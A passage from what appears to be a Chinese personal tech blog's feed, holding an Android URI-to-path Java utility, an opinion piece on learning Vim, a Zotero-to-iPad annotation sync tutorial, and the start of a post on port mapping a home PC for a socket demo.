class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.raven.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.annotation.SuppressLint;</span><br><span class="line"><span class="keyword">import</span> android.content.ContentUris;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.database.Cursor;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.provider.DocumentsContract;</span><br><span class="line"><span class="keyword">import</span> android.provider.MediaStore;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AlbumUtil</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据Uri获取图片的绝对路径</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context 上下文对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> uri     图片的Uri</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 如果Uri对应的图片存在, 那么返回该图片的绝对路径, 否则返回null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getRealPathFromUri</span><span class="params">(Context context, Uri uri)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sdkVersion = Build.VERSION.SDK_INT;</span><br><span class="line">        <span class="keyword">if</span> (sdkVersion &gt;= <span class="number">19</span>) &#123; </span><br><span class="line">            <span class="keyword">return</span> getRealPathFromUriAboveApi19(context, uri);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> getRealPathFromUriBelowAPI19(context, uri);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 适配api19以下(不包括api19),根据uri获取图片的绝对路径</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context 上下文对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> uri     图片的Uri</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 如果Uri对应的图片存在, 那么返回该图片的绝对路径, 否则返回null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getRealPathFromUriBelowAPI19</span><span class="params">(Context context, Uri uri)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getDataColumn(context, uri, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 适配api19及以上,根据uri获取图片的绝对路径</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context 上下文对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> uri     图片的Uri</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 如果Uri对应的图片存在, 那么返回该图片的绝对路径, 否则返回null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@SuppressLint(&quot;NewApi&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getRealPathFromUriAboveApi19</span><span class="params">(Context context, Uri uri)</span> </span>&#123;</span><br><span class="line">        String filePath = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (DocumentsContract.isDocumentUri(context, uri)) &#123;</span><br><span class="line">            <span class="comment">// 如果是document类型的 uri, 则通过document id来进行处理</span></span><br><span class="line">            String documentId = DocumentsContract.getDocumentId(uri);</span><br><span class="line">            <span class="keyword">if</span> (isMediaDocument(uri)) &#123;</span><br><span class="line">                <span class="comment">// 使用&#x27;:&#x27;分割</span></span><br><span class="line">                String id = documentId.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                String selection = MediaStore.Images.Media._ID + <span class="string">&quot;=?&quot;</span>;</span><br><span class="line">                String[] selectionArgs = &#123;id&#125;;</span><br><span class="line">                filePath = getDataColumn(context, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, selection, selectionArgs);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isDownloadsDocument(uri)) &#123; </span><br><span class="line">                Uri contentUri = ContentUris.withAppendedId(Uri.parse(<span class="string">&quot;content://downloads/public_downloads&quot;</span>), Long.valueOf(documentId));</span><br><span class="line">                filePath = getDataColumn(context, contentUri, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;content&quot;</span>.equalsIgnoreCase(uri.getScheme())) &#123;</span><br><span class="line">            <span class="comment">// 如果是 content 类型的 Uri</span></span><br><span class="line">            filePath = getDataColumn(context, uri, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;file&quot;</span>.equals(uri.getScheme())) &#123;</span><br><span class="line">            <span class="comment">// 如果是 file 类型的 Uri,直接获取图片对应的路径</span></span><br><span class="line">            filePath = uri.getPath();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> filePath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取数据库表中的 _data 列，即返回Uri对应的文件路径</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getDataColumn</span><span class="params">(Context context, Uri uri, String selection, String[] selectionArgs)</span> </span>&#123;</span><br><span class="line">        String path = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        String[] projection = <span class="keyword">new</span> String[]&#123;MediaStore.Images.Media.DATA&#125;;</span><br><span class="line">        Cursor cursor = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cursor = context.getContentResolver().query(uri, projection, selection, selectionArgs, <span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">if</span> (cursor != <span class="keyword">null</span> &amp;&amp; cursor.moveToFirst()) &#123;</span><br><span class="line">                <span class="keyword">int</span> columnIndex = cursor.getColumnIndexOrThrow(projection[<span class="number">0</span>]);</span><br><span class="line">                path = cursor.getString(columnIndex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cursor != <span class="keyword">null</span>) &#123;</span><br><span class="line">                cursor.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> uri the Uri to check</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Whether the Uri authority is MediaProvider</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isMediaDocument</span><span class="params">(Uri uri)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;com.android.providers.media.documents&quot;</span>.equals(uri.getAuthority());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> uri the Uri to check</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Whether the Uri authority is DownloadsProvider</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isDownloadsDocument</span><span class="params">(Uri uri)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;com.android.providers.downloads.documents&quot;</span>.equals(uri.getAuthority());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>本文所有代码都已上传至github，有需求朋友可自行下载查看。</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVuLW1pc2MvQW5kcm9pZC1DYW1lcmEtQWxidW0=" title="https://github.com/raven-misc/Android-Camera-Album">https://github.com/raven-misc/Android-Camera-Album<i class="fa fa-external-link"></i></span></p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 相机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人向-对Vim的一点看法</title>
      <link href="/archives/d009831a.html"/>
      <url>/archives/d009831a.html</url>
      
        <content type="html"><![CDATA[<p><img data-src="https://ae01.alicdn.com/kf/HTB1fP.ZXQT2gK0jSZPc763KkpXap.png"></p><p>Vim，编辑器之神。凡是接触过Linux的朋友，肯定都知道这个编辑器。</p><a id="more"></a><p>大家对于这款编辑器的评价更是褒贬不一。有人说：这玩意用熟以后就是一个字-“快”，能够大幅度提高码字效率。也有人说：有IDE了还用vim的就是傻逼。嗯，vim很快，满配的vim抵得上我vs的1/3了，记住IDE的快捷键一样能够大幅效率。还有一种朋友则是混用–在IDE中安装vim的插件。</p><p>那么我也来说说我对Vim的看法，首先谈谈我的Vim经历，跳进Vim坑爬出来又跳进去差不多反复了3,4次。不想看的跳到后面看推荐使用就好了。</p><ol><li><p><strong>第一次：</strong>刚接触Linux，Liunx本身的命令就够我记了，还要学习Vim，简直难受，没多久就弃坑了，Windows这么多好用的编辑器干嘛用这货，再不济我用gedit都好受一点，所以最后差<strong>不多就记得个 h j k l</strong>以及如果保存文件和退出Vim。（没错，我就是那个不知道怎么退出Vim的人）。</p></li><li><p><strong>第二次：</strong>基本上能够在Linux存活了，网上一堆吹爆Vim的，是时候来学习一会了，在网上搜索了几篇博文，算是<strong>学会了一些基本功能</strong>，d, c, y ,操作符+motion符的操作等等。但是感觉效率也就那样吧，好多人总是吹什么在操作前加number，就能重复执行该命令多少次。比如粘贴100次当前行，先yy，然后100p。可是问问自己，这样的场景真的多吗？显然不多。又如好多人说的从鼠标中解救出来，这倒是不假，但是反复地按移动快捷键按得手抽筋。写代码也没办法提示，我这种渣渣码农还是算了吧，没多久就再次弃坑。一度怀疑是网上的人过分神话。</p></li><li><p><strong>第三次：</strong>再次接触Vim可能都过了大半年，源于一次实习，当时实习做的是嵌入式的东西，要在Linux上做开发，当时的领头采用的是在Windows上开发，通过虚拟机共享文件夹共享到Linux上编译。我觉得这一来一回的简直麻烦，正好学了点Makefile，所以又用起了Vim，当然了这次我知道通过<strong>安装插件来拓展Vim功能</strong>，并且知道了一键配置Vim的脚本–spf13。有了一堆插件的辅助，不得不说用着其实还行，但是还是有一个老毛病，快捷键按得我的手真的痛，而且由于Vim的快捷键在我这里还未形成肌肉记忆，网网还会动脑去想一下要跳转到xx地方，我该用什么快捷好一点（Vim有太多种跳转的方式了）。make之后形成的qucikfix窗口也让我感觉不太好用，最要命的是文件导航栏，即使当时安装了NERD Tree插件，我仍觉得非常难用。实习用Vim大约用了4天，我<strong>改用了Sclickedi</strong>t，个人觉得是liunx上最好用的C/C++ IDE。</p></li><li><p><strong>第四次：</strong> 第四次也就是最近了，毕业了放假回来总得学点什么吧。想着未来的研究方向肯定离不开Linux，又想到了学Vim。开工之前我在网上搜寻了10多20篇帖子来说到底该不该学Vim，答案也就如本文开头说的那样。我呢，是一个热爱新鲜事物的人，就想知道到底要怎么样用Vim才是最舒服的。既然最近也闲，那就翻到头重新学，于是网上搜什么书比较好，得到的结果是下面这本：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1B_w2XUD1gK0jSZFGq6zd3FXa0.jpg"></p><p><strong>额外说一句：其实这本书书并不是写给新手的，它根本不会说什么h j k l 打开退出vim的方法，介绍的是vim使用的一些技巧，通过技巧让人熟悉Vim的使用方式。</strong></p><p>行吧，那就开始看呗。在家宅了4天的样子，通读了一遍，确实学到了不少，如<strong>经典的点范式操作，录制编辑宏，寄存器的概念与使用，共享系统剪贴板，标记代码行，.vimrc的简单配置，快速切换上次编辑过的地方等等等等</strong>。</p><p>这本书算是涉及到了Vim的各种基础知识，但是有一个却讲得非常少，那就是Vim的插件管理。于是我又去搜索了一些插件管理的博文，学习了，<strong>知道vundle怎么用</strong>。</p><p>然后就到了打造自己的vim IDE for C/C++时间了，我参见的文章是这个：</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lhbmd5YW5nd2l0aGdudS91c2VfdmltX2FzX2lkZQ==" title="https://github.com/yangyangwithgnu/use_vim_as_ide">https://github.com/yangyangwithgnu/use_vim_as_ide<i class="fa fa-external-link"></i></span></p><p>作者说要配置完成，大约80页+，所以vim打磨真的是会折磨人。</p><p>花了一天时间，挑选了个人认为有用的配置。配置成自己习惯的键位映射，有用的插件。但，就目前来说，我仍不想用它来开发项目。我不习惯vim的文件导航方式，更不喜欢gdb的调试方式，YouCompleteMe插件很强，但是配置起来真的很伤。</p><p>虽然整个配置过程很长，也折腾人。不过跟着走一遍配置流程后，你会发现之后只用vimrc文件然后稍加配置就好了。重点是你要知道vimrc每个部分是干什么的，并修改为适合个人习惯的方式。</p><h2 id="最终中的结果与建议"><a href="#最终中的结果与建议" class="headerlink" title="最终中的结果与建议"></a>最终中的结果与建议</h2><p><strong>那么未来我会不会用vim的开发项目呢？我想我仍然不会</strong>，那我花费了这么长的时间是为什么学习呢？好的来说是为了确定vim到底能不能做，好不好做大型项目开发。答案是能做，也好做，但有更好的方法。坏的来说就是闲的蛋疼。现在回忆起实习时老师的方法其实反而是一种很好的方法，在windows上开发，到linux上编译，又或者使用slickedit这类IDE，其实很nice的。学vim不是说没用，做服务器运维的，在服务器这玩意才好用，所以肯定要学；另外基本上所有的主流IDE都支持VIM，连浏览器都有Vim的插件，学习Vim后，可以在各类IDE中通用一套Vim快捷键，这叫取其精华去其糟粕。</p><p><strong>所以，在IDE中安装Vim才是王道，未来我应该会用Clion+ideavim(ideavim支持自定义vimrc)。</strong></p><p>对于那些想进入vim的朋友来说，其实我觉得下面这张图说得还是颇有几分道理，vim的入门的确很陡峭。如果你要采用混用的方式，我建议还是要把<strong>《Vim使用技巧》这本书读了</strong>，毕竟读完你就算是能够对vim有个大范围了解。而不仅仅是几个h j k l :wq 替换，操作符+motion符这些基础东西。</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1PEo1XQY2gK0jSZFgq6A5OFXaF.jpg"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>研究僧-在IPAD上阅读文献并与Zotero文献库同步</title>
      <link href="/archives/1b8fe85b.html"/>
      <url>/archives/1b8fe85b.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><blockquote><p> 下半年就要正式进入研究僧生活了，研究僧注定要阅读一大堆论文嘛，所以这篇文章就算是提前为阅读文献做准备咯。</p><p> 相信常年累月阅读文献的你一定会有一个自己的文献库，并用某款文献管理软件维护着。我来说说个人的一点小经历吧，文献管理软件我用过两款，一个是EndNote一个是<strong>zotero</strong>，经过综合对比，最终我选择了<strong>zotero</strong>。</p></blockquote><a id="more"></a><blockquote><p> 然而最近面临一个问题，我手上有一个ipad，自从咬咬牙入了apple pencil后，发现拿ipad来读pdf真的是超棒，批注、记笔记都很nice，所以就萌生了拿ipad来读文献的想法。我想实现的功能很简单:</p><ul><li><p><strong>将PC端的zotero文献库同步到IPAD上来，PC批注某篇paper后，IPAD上可以得到批注后的结果，反之亦然。</strong></p><p>经过一波百度、google后，我发现大多方法都是让在ipad上安装papership这款软件，我立马就试了试，简单说下效果：</p></li></ul><p> <strong>优点：</strong>能够完美实现文献库的文件同步，包括目录树，一个item下有多个附件均可同步下来。</p><p> 缺点：如果想要在ipad上批注并同步回PC端，需要<strong>付费68元</strong>。另外。我也简单尝试了下它的批注功能，发现并不完美。</p><p> zotero文献库图与Papgeship 同步后的效果如图：</p><p> <img data-src="https://ae01.alicdn.com/kf/HTB1ZV6dXAL0gK0jSZFtq6xQCXXap.jpg"></p><p> <img data-src="https://ae01.alicdn.com/kf/HTB13sLbXAP2gK0jSZPx761cQpXa2.png"></p><p> 之后继续搜索和尝试，发现另一种比较完美的解决方案。于是，就有了今天这篇分享。</p></blockquote><p>最终实现的视频Demo：</p><iframe id="spkj" src="//player.bilibili.com/player.html?aid=58535591&cid=102086302&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width=100%> </iframe>!!!<script type="text/javascript">  document.getElementById("spkj").style.height=document.getElementById("spkj").scrollWidth*0.76+"px";</script>!!!<h2 id="2-材料准备"><a href="#2-材料准备" class="headerlink" title="2. 材料准备"></a>2. 材料准备</h2><p>需要用到的软件与插件较多，清单如下：</p><ul><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuem90ZXJvLm9yZy8=" title="https://www.zotero.org/">zotero PC端<i class="fa fa-external-link"></i></span></p></li><li><p>zotero Chrome插件（和本文同步无关，可以不安装，但是你都安装zotero软件了，不安装这个插件那简直是浪费）</p></li><li><p>ZotFile 插件 for zotero（ZotFile插件安装说明见下文）<br><strong>链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWFLTXM1NkhwTWpSQ19JYmdHQ1dSR2c=" title="https://pan.baidu.com/s/1aKMs56HpMjRC_IbgGCWRGg">https://pan.baidu.com/s/1aKMs56HpMjRC_IbgGCWRGg<i class="fa fa-external-link"></i></span>  提取码：tzo5 。请勿安装官方版本，因为官网目前在PC到IPAD的同步上还有点问题，这个是我自己对官网稍作修改的版本，不放心安装的可自行查看源码:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L3pvdGZpbGU=" title="https://github.com/ravenxrz/zotfile">https://github.com/ravenxrz/zotfile<i class="fa fa-external-link"></i></span></strong></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbmd1b3l1bi5jb20v" title="https://www.jianguoyun.com/">坚果云 PC端<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbmd1b3l1bi5jb20v" title="https://www.jianguoyun.com/">坚果云 网页端（不需要安装，但是之后配置同步环境需要使用到）<i class="fa fa-external-link"></i></span></p></li><li><p>Pdf Expert 6 for Ipad，付费软件，原价68，可上淘宝买，个人觉得IPAD上最好用的PDF软件了</p></li></ul><h2 id="3-同步原理说明"><a href="#3-同步原理说明" class="headerlink" title="3. 同步原理说明"></a>3. 同步原理说明</h2><p>这里贴一张图说一下本方案的同步原理</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1n5zaXCf2gK0jSZFPq6xsopXaS.jpg"></p><ol><li>从zotero文献库中选取出需要同步到IPAD的文件，若要全部同步就全选即可。将这些文件放到一个指定的目录下；</li><li>使用坚果云设置该目录为“同步目录”，这样每当该目录发生更改，坚果云会自动将更改上传至坚果云盘中；</li><li>打开PDF EXERT，自动从坚果云盘中拉取最新目录数据；</li><li>PDF EXPERT同步完成后，即可使用IPAD批注；</li><li>IPAD批注完成后，PDF EXPERT将会自动上传文件至云盘；</li><li>PC端的zotero将PDF EXPERT上传的文件拉取至PC本地设置的同步目录；</li><li><strong>采用ZotFile插件将同步目录中的文件再还原至文献库的对应位置。</strong></li></ol><p>上述流程看着略显复杂，但是当环境配置好后，整个流程就会非常简单了。需要人工操作的也就3步：</p><ol><li>选择需要同步到IPAD的文献库，用ZotFile自动推送到同步目录</li><li>IPAD批注</li><li>用ZotFile将IPAD批注后的文件拉回Zotero文献库</li></ol><h2 id="4-开始配置"><a href="#4-开始配置" class="headerlink" title="4. 开始配置"></a>4. 开始配置</h2><h3 id="4-1-ZotFile安装"><a href="#4-1-ZotFile安装" class="headerlink" title="4.1 ZotFile安装"></a>4.1 ZotFile安装</h3><p>zotero，坚果云，pdf expert这几个软件安装都是一键式的，没什么可说的，简单说下ZotFile如何安装，从官网下载好ZotFile：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1cuLdXAL0gK0jSZFtq6xQCXXap.jpg"></p><p>打开zotero，打开工具-&gt;插件,得到如下界面：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1lu_dXAH0gK0jSZFNq6xMqXXa4.jpg"></p><p>将ZotFile的文件拖入到这个界面即可，然后重启Zotero软件，就完成了安装。</p><h3 id="4-2-配置ZotFile"><a href="#4-2-配置ZotFile" class="headerlink" title="4.2 配置ZotFile"></a>4.2 配置ZotFile</h3><p>首先需要在PC本地建立一个用于同步的文件夹，如图：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1QATbXCf2gK0jSZFPq6xsopXaF.jpg"></p><p>接着打开zotero，工具-&gt;ZotFile Preferences-&gt;Tablet Setting,然后如图设置:</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1oAPcXEY1gK0jSZFCq6AwqXXaR.jpg"></p><p><strong>选择自己的同步文件夹。</strong></p><h3 id="4-3-设置坚果云同步"><a href="#4-3-设置坚果云同步" class="headerlink" title="4.3 设置坚果云同步"></a>4.3 设置坚果云同步</h3><p>注册坚果云账号，并登陆PC软件，然后来到你刚才设置的同步文件夹下，鼠标右键-&gt;坚果云-&gt;同步文件夹，之后每当这个文件夹发生变化，坚果云就会同步它。</p><h3 id="4-4-设置坚果云WebDAV服务"><a href="#4-4-设置坚果云WebDAV服务" class="headerlink" title="4.4 设置坚果云WebDAV服务"></a>4.4 设置坚果云WebDAV服务</h3><p>打开坚果云网页端，登陆到后台，</p><p><img data-src="https://ae01.alicdn.com/kf/HTB10BPXXqL7gK0jSZFBq6xZZpXa6.jpg"></p><p>点击添加应用后，输入pdfexpert，点完成即可。</p><h3 id="4-5-设置PDF-EXPERT-同步服务"><a href="#4-5-设置PDF-EXPERT-同步服务" class="headerlink" title="4.5 设置PDF EXPERT 同步服务"></a>4.5 设置PDF EXPERT 同步服务</h3><p>打开IPAD上的PDF EXPERT，添加账号后，设置如下：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB14RbdXxD1gK0jSZFK763JrVXab.png"></p><p><img data-src="https://ae01.alicdn.com/kf/HTB1lZPeXrY1gK0jSZTE760DQVXaL.png"></p><p>最后需要打开右上角的同步。</p><h2 id="5-开始使用吧"><a href="#5-开始使用吧" class="headerlink" title="5. 开始使用吧"></a>5. 开始使用吧</h2><h3 id="5-1-选择需要同步到IPAD的文献库，用ZotFile自动推送到同步目录"><a href="#5-1-选择需要同步到IPAD的文献库，用ZotFile自动推送到同步目录" class="headerlink" title="5.1  选择需要同步到IPAD的文献库，用ZotFile自动推送到同步目录"></a>5.1  选择需要同步到IPAD的文献库，用ZotFile自动推送到同步目录</h3><p><img data-src="https://ae01.alicdn.com/kf/HTB1YBzaXpT7gK0jSZFpq6yTkpXad.jpg"></p><p><img data-src="https://ae01.alicdn.com/kf/HTB1PN2fXBr0gK0jSZFnq6zRRXXaE.jpg"></p><h3 id="5-2-打开PDF-EXPERT来同步文件"><a href="#5-2-打开PDF-EXPERT来同步文件" class="headerlink" title="5.2 打开PDF EXPERT来同步文件"></a>5.2 打开PDF EXPERT来同步文件</h3><p><img data-src="https://ae01.alicdn.com/kf/HTB1PKTeXET1gK0jSZFrq6ANCXXaT.jpg"></p><p>可以看到它已经被同步下来，可以打开它随便批注点什么。</p><p>修改前：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1FyrfXAH0gK0jSZPiq6yvapXak.jpg"></p><p>修改后：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1hcjeXuP2gK0jSZFoq6yuIVXaa.jpg"></p><h3 id="5-3-用ZotFile拉回文献库"><a href="#5-3-用ZotFile拉回文献库" class="headerlink" title="5.3 用ZotFile拉回文献库"></a>5.3 用ZotFile拉回文献库</h3><p><img data-src="https://ae01.alicdn.com/kf/HTB1bNYbXpP7gK0jSZFjq6A5aXXa4.jpg"></p><p>这里还可以点击Get From Tablet完成拉回，两者的区别在于，Update FileModication Time不在同步文件夹中删除该条目，之后仍可以在IPAD和PC之间同步，点击Get From Tablet在拉回到文献库的同时，删除该条目，之后无法在IPAD和PC之间同步。</p><p>最后来看看PC端同步后的效果：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1EqvcXq67gK0jSZFHq6y9jVXaL.jpg"></p><p>至于PC端修改后再同步到IPAD操作过程亦然，修改文件后，在选择Send To Tablet（或选择对应类别目录，如我这里就是Tablet同步测试）即可。</p><h2 id="6-结语"><a href="#6-结语" class="headerlink" title="6. 结语"></a>6. 结语</h2><p>算是找到个比较完美的方案吧，唯一的不足就是同步过于频繁的话，坚果云每个月的流量容易不足，所以需要控制一下更新的频率。</p><p>最后，希望未来生活顺利吧。</p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文献 </tag>
            
            <tag> 同步 </tag>
            
            <tag> zotero </tag>
            
            <tag> ipad </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用内网穿透实现Socket外网通信</title>
      <link href="/archives/b2d369c2.html"/>
      <url>/archives/b2d369c2.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><blockquote><p>需求提出：还有两三天就要参加毕业设计答辩了。一直在考虑怎么样给老师做展示才好。由于毕设做的是基于深度学习的去雾研究。只有一台PC，也就意味着只能录屏？感觉录屏不好啊，所以想了下要不<strong>做个Android App展示去雾</strong>？可是研究了下<strong>把Keras模型移植到Android上</strong>似乎也不太轻松，因为我的模型中有些自定义层，不是标准的模型。<strong>再来就想要不把模型放到服务器上</strong>？但是我的服务器性能这么垃圾，而且服务器在国外，上传下载速度也不行。最后，要不就拿现在这台PC来做？可是问题来了，我怎么才能<strong>走广域网连接PC</strong>呢，毕竟答辩不可能在寝室。<br>OK，百度一波，还是选择内网穿透吧。</p><p>第一次接触内网穿透是在去年10月还是11月的**<a href="https://www.ravenxrz.ink/2019/05/03/reuse-of-old-mobile-phonea-downloader-based-on-arria2.html">“搭建aria2远程下载机”</a>**。所以对内网穿透这个名词还不算陌生。（看样子曾经无聊搞的东西还是可能在未来帮到自己啊）</p></blockquote><a id="more"></a><p>[post cid=”36” /]</p><p>好了，废话了一堆，本文要做的功能有：</p><ol><li>以台式机作为服务器，等待客户端上传图片，服务器将图片去雾后回传给客户端。</li><li>既然台式机要做服务器，那就必须来个内网穿透了，不然外网的手机是不能连接到PC的。</li><li>服务器与客户端的通信使用的Socket</li></ol><h2 id="2-正文“斯达头”（start）"><a href="#2-正文“斯达头”（start）" class="headerlink" title="2. 正文“斯达头”（start）"></a>2. 正文“斯达头”（start）</h2><h3 id="2-1-材料准备"><a href="#2-1-材料准备" class="headerlink" title="2.1 材料准备"></a>2.1 材料准备</h3><ol><li>PC机</li><li>花生壳账号</li></ol><h3 id="2-2-花生壳注册与端口映射"><a href="#2-2-花生壳注册与端口映射" class="headerlink" title="2.2 花生壳注册与端口映射"></a>2.2 花生壳注册与端口映射</h3><p>登陆官网，并注册：<span class="exturl" data-url="aHR0cHM6Ly9oc2sub3JheS5jb20v" title="https://hsk.oray.com/">https://hsk.oray.com/<i class="fa fa-external-link"></i></span> 